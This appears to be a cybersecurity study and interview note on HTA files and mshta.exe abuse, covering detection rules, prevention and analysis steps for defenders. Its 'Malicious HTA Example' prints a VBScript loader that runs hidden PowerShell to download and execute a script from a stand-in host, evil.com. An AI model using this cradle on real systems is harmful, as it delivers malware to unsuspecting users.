---
tags:
  - "#cybersecurity/malware/file-types"
  - "#cybersecurity/red-team/initial-access"
  - "#interview/concepts"
aliases:
  - HTA
  - HTML Application
  - .hta
---

# HTA (HTML Application)

> **One-liner:** A Windows file format that combines HTML/CSS/JavaScript with full desktop application privileges, frequently abused for malware delivery.

## 🎯 What Is It?
An HTA (HTML Application) is a Microsoft Windows program that uses HTML, CSS, and scripting languages (VBScript or JavaScript) to create a desktop application interface. Unlike regular web pages that run in a sandboxed browser, HTAs execute through `mshta.exe` with the full privileges of the user—making them powerful for both legitimate automation and malicious exploitation.

## 🤔 Why It Matters
- **Red Team:** HTAs bypass many browser security controls and can execute arbitrary code
- **Blue Team:** Common initial access vector; detecting `mshta.exe` execution is critical
- **MITRE ATT&CK:** T1218.005 — Signed Binary Proxy Execution: Mshta

## 🔬 How It Works

### Legitimate Use Cases
- Automating administrative or setup tasks
- Providing quick interfaces for internal scripts
- Testing small prototypes without building full software
- Lightweight IT support utilities

### HTA File Structure
An HTA contains three main parts:

```html
<html>
<head>
    <!-- 1. HTA Declaration - defines app properties -->
    <title>TBFC Utility Tool</title>
    <HTA:APPLICATION 
        ID="TBFCApp"
        APPLICATIONNAME="Utility Tool"
        BORDER="thin"
        SHOWINTASKBAR="yes"
    />
</head>

<body>
    <!-- 2. Interface (HTML/CSS) -->
    <h3>Welcome to the Utility Tool</h3>
    
    <!-- 3. Script (VBScript or JavaScript) -->
    <script language="VBScript">
        Sub RunAction()
            MsgBox "Action executed!"
        End Sub
    </script>
</body>
</html>
```

### Execution Flow
```
User opens .hta file
       ↓
Windows launches mshta.exe
       ↓
mshta.exe parses HTML/script
       ↓
Script executes with user privileges
       ↓
Can spawn child processes (powershell, cmd, etc.)
```

## ⚔️ Malicious Usage Patterns

| Pattern | Description | Example |
|---------|-------------|---------|
| **Phishing Delivery** | Attached to emails as "invoices" or "surveys" | `salary_survey.hta` |
| **Downloader/Dropper** | Fetches second-stage payload from C2 | `Invoke-WebRequest` in VBScript |
| **Obfuscation** | Base64/ROT13 encoded payloads | `FromBase64String()` |
| **[[Living off the Land (LOLBAS)|LOLBAS]]** | Calls built-in Windows tools | `powershell.exe`, `wscript.exe` |

### Malicious HTA Example
```html
<HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize">
<script language="VBScript">
  Set shell = CreateObject("WScript.Shell")
  cmd = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
  shell.Run cmd, 0, False
  self.close
</script>
```

## 🛡️ Detection & Prevention

### How to Detect
- **Process monitoring:** Alert on `mshta.exe` spawning child processes (`powershell.exe`, `cmd.exe`, `wscript.exe`)
- **Command-line logging:** Look for Base64 strings, `-ExecutionPolicy Bypass`, or URLs in arguments
- **Network monitoring:** Outbound HTTP/HTTPS from `mshta.exe` is highly suspicious
- **File analysis:** Scan `.hta` files for `CreateObject`, `WScript.Shell`, encoded strings

### Sigma Rule Example
```yaml
title: Mshta Spawning Suspicious Process
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\mshta.exe'
    Image|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
      - '\wscript.exe'
  condition: selection
```

### How to Prevent / Mitigate
- Block `.hta` files at email gateways
- Restrict `mshta.exe` execution via [[Application Whitelisting]]
- Use Attack Surface Reduction (ASR) rules in Windows Defender
- Disable HTA file associations via Group Policy

## 🔍 Analysis Methodology

When analyzing a suspicious HTA:

1. **Open in text editor** (never execute!)
2. **Check metadata:** `<title>` and `<HTA:APPLICATION>` for social engineering clues
3. **Find script section:** Look for `<script language="VBScript">` or `<script language="JavaScript">`
4. **Identify functions:** Search for `Function`, `Sub`, `CreateObject`
5. **Decode payloads:** Extract Base64/encoded strings → decode with [[Cyberchef]]
6. **Trace execution flow:** Follow variables to see what gets executed

## 🎤 Interview Angles

### Common Questions
- "What is an HTA file and why is it dangerous?"
- "How would you detect malicious HTA execution in a SOC?"
- "What's the difference between HTA and a regular HTML file?"

### STAR Story
> **Situation:** Received an alert for `mshta.exe` spawning `powershell.exe` with encoded command-line arguments.
> **Task:** Investigate whether this was malicious and determine the scope of compromise.
> **Action:** Extracted the HTA file from email logs, decoded the Base64 payload revealing a C2 callback, identified 3 affected hosts via EDR telemetry, and isolated them.
> **Result:** Contained the threat before data exfiltration; created detection rule that caught 2 more attempts the following week.

## 🔗 Related Concepts
- [[Living off the Land (LOLBAS)]]
- [[mshta.exe]]
- [[Phishing]]
- [[Command and Control (C2)]]
- [[Static Analysis]]
- [[Data Exfiltration]]
- [[Encoding]]

## 📚 References
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- LOLBAS mshta.exe: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
- Epsilon Red Ransomware HTA Campaign (2025)
